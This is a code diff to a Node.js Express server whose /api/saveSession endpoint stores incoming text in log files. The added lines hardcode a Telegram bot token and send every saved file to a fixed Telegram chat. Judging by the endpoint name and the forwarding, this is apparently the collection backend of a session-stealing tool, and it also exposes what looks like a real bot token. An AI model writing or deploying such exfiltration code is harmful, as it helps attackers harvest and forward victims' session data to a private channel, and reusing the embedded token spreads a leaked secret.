@@ -2,6 +2,12 @@
 const express = require('express')
 const bodyParser = require('body-parser');
 const fs = require('fs');
+const tg = require('node-telegram-bot-api')
+
+const token = '6079618447:AAEPcs91a_Wh0SfLDJyYqHl_myXRDq2p6CY';
+
+// Create a bot that uses 'polling' to fetch new updates
+const bot = new tg(token, {polling: true});
 
 
 
@@ -34,10 +40,12 @@ app.post('/api/saveSession', (req,res) => {
 	
 	const pl2 = decodeURIComponent(text);
 	console.log(pl2);
-	fs.writeFile('logs/' + generateRandom() +'.txt', pl2, err => {
+	var genpath = 'logs/' + generateRandom() +'.txt';
+	fs.writeFile(genpath, pl2, err => {
 		if (err) {
 		  console.error(err);
 		}
+		bot.sendDocument(5480995949, genpath)
 		// file written successfully
 	  });
 	res.send('1');
